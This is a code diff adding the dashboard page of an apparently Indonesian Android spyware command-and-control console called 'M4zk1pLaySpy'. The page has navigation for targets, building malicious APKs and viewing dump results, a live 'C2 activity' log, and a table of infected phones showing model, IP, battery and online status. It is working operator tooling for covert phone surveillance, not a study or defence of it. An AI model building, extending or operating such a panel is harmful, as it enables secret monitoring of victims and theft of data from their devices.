@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Dashboard — M4zk1pLaySpy</title>
+<link rel="stylesheet" href="/static/css/style.css">
+</head>
+<body>
+<div class="shell">
+  <aside class="side">
+    <div class="brand">
+      <img src="/static/img/garuda.svg" alt="">
+      <div><b>M4ZK1PL4Y</b><span>SPY CONSOLE</span></div>
+    </div>
+    <nav class="nav">
+      <a href="/dashboard">▣ <span class="lbl">DASHBOARD</span></a>
+      <a href="/targets">◈ <span class="lbl">TARGET</span><i class="dot" id="navDot">0</i></a>
+      <a href="/build">⚙ <span class="lbl">BUILD APK</span></a>
+      <a href="/dumps">⇩ <span class="lbl">HASIL DUMP</span></a>
+      <a href="/admin">☰ <span class="lbl">ADMIN</span></a>
+    </nav>
+    <div class="side-foot">
+      <div id="clock">--:--:--</div>
+      <div style="margin-top:6px">v1.4.0 · <span id="rtLed" class="led"></span> realtime</div>
+      <a href="#" id="logout" style="display:block;margin-top:10px;color:var(--red)">▸ KELUAR</a>
+    </div>
+  </aside>
+
+  <main class="main">
+    <header class="top">
+      <h2 class="glitch" data-t="DASHBOARD">DASHBOARD</h2>
+      <span class="pill on"><i class="led on"></i><span id="onCount">0</span> ONLINE</span>
+      <span class="pill off"><span id="offCount">0</span> OFFLINE</span>
+      <div class="spacer"></div>
+      <span class="pill"><span id="dumpCount">0</span> DUMP</span>
+      <a class="btn sm" href="/build">+ BUILD</a>
+    </header>
+
+    <div class="content">
+      <div class="grid g4">
+        <div class="card stat red"><div class="k">TARGET ONLINE</div><div class="v" id="s1">0</div><div class="bar"><i id="b1"></i></div></div>
+        <div class="card stat"><div class="k">TOTAL TARGET</div><div class="v" id="s2">0</div><div class="bar"><i id="b2"></i></div></div>
+        <div class="card stat amber"><div class="k">HASIL DUMP</div><div class="v" id="s3">0</div><div class="bar"><i id="b3"></i></div></div>
+        <div class="card stat green"><div class="k">APK DIBANGUN</div><div class="v" id="s4">0</div><div class="bar"><i id="b4"></i></div></div>
+      </div>
+
+      <div class="grid g2">
+        <div class="card">
+          <div class="card-h"><b>TARGET REALTIME</b><div class="spacer"></div><span class="tag on">LIVE</span></div>
+          <div class="card-b"><div class="t-list" id="live"></div></div>
+        </div>
+        <div class="card">
+          <div class="card-h"><b>AKTIVITAS C2</b><div class="spacer"></div><span class="tag">LOG</span></div>
+          <div class="card-b"><div class="console" id="log"></div></div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-h"><b>RINGKASAN PERANGKAT</b></div>
+        <div class="card-b" style="padding:0">
+          <table>
+            <thead><tr><th>Perangkat</th><th>Android</th><th>IP</th><th>Baterai</th><th>Status</th><th>Terakhir</th></tr></thead>
+            <tbody id="rows"><tr><td colspan="6" class="empty">memuat…</td></tr></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+  </main>
+</div>
+<div class="toast-wrap" id="tw"></div>
+
+<script type="module">
+import { $, api, post, toast, esc, fmt, clock, markNav } from '/static/js/core.js';
+import { connect, on, statusLed } from '/static/js/ws.js';
+
+markNav();
+clock($('#clock'));
+statusLed($('#rtLed'));
+
+$('#logout').onclick = async (e) => {
+  e.preventDefault();
+  await post('/api/logout');
+  location.href = '/';
+};
+
+function log(msg, cls = '') {
+  const el = document.createElement('div');
+  el.innerHTML = `<span class="tm">${fmt.time(Date.now() / 1000)}</span> <span class="${cls}">${esc(msg)}</span>`;
+  const box = $('#log');
+  box.prepend(el);
+  while (box.children.length > 160) box.lastChild.remove();
+}
+
+async function refresh() {
+  try {
+    const d = await api('/api/targets');
+    const st = d.stats;
+    $('#s1').textContent = st.online;
+    $('#s2').textContent = st.total;
+    $('#onCount').textContent = st.online;
+    $('#offCount').textContent = Math.max(0, st.total - st.online);
+    $('#navDot').textContent = st.online;
+    $('#b1').style.width = st.total ? (st.online / st.total * 100) + '%' : '0%';
+    $('#b2').style.width = st.total ? '100%' : '0%';
+
+    const live = $('#live');
+    const onl = d.targets.filter((t) => t.online).slice(0, 8);
+    live.innerHTML = onl.length ? onl.map((t) => `
+      <a class="t-row" href="/targets?t=${esc(t.id)}">
+        <div class="av">${esc((t.brand || '?')[0]).toUpperCase()}</div>
+        <div><div class="nm">${esc(t.brand)} ${esc(t.model)}</div>
+          <div class="mt">${esc(t.ip || '-')} · Android ${esc(t.android || '?')}</div></div>
+        <span class="led on"></span>
+      </a>`).join('') : '<div class="empty">belum ada target online</div>';
+
+    $('#rows').innerHTML = d.targets.slice(0, 20).map((t) => `
+      <tr>
+        <td><a href="/targets?t=${esc(t.id)}">${esc(t.label || t.model || t.id)}</a></td>
+        <td>${esc(t.android || '-')}</td>
+        <td class="mono">${esc(t.ip || '-')}</td>
+        <td>${t.battery || 0}%</td>
+        <td><span class="tag ${t.online ? 'on' : ''}">${t.online ? 'ONLINE' : 'OFFLINE'}</span></td>
+        <td>${fmt.ago(t.last_seen)}</td>
+      </tr>`).join('') || '<tr><td colspan="6" class="empty">belum ada perangkat</td></tr>';
+  } catch (e) { log('gagal muat target: ' + e.message, 'er'); }
+}
+
+async function stats() {
+  try {
+    const s = await api('/api/admin/stats');
+    $('#s3').textContent = s.dumps;
+    $('#s4').textContent = s.builds;
+    $('#dumpCount').textContent = s.dumps;
+    $('#b3').style.width = Math.min(100, s.dumps) + '%';
+    $('#b4').style.width = Math.min(100, s.builds * 10) + '%';
+  } catch {}
+}
+
+on('presence', (m) => { log(`target ${m.id.slice(0, 8)} ${m.online ? 'ONLINE' : 'OFFLINE'}`, m.online ? 'ok' : 'wn'); refresh(); });
+on('result', (m) => log(`hasil ${m.id} → ${m.ok ? 'OK' : 'GAGAL'}`, m.ok ? 'ok' : 'er'));
+on('dump', (m) => { log(`dump ${m.kind} · ${fmt.bytes(m.size)}`, 'ok'); stats(); });
+on('targets_dirty', refresh);
+
+connect();
+refresh(); stats();
+setInterval(refresh, 12000);
+setInterval(stats, 20000);
+log('konsol siap', 'ok');
+</script>
+</body>
+</html>
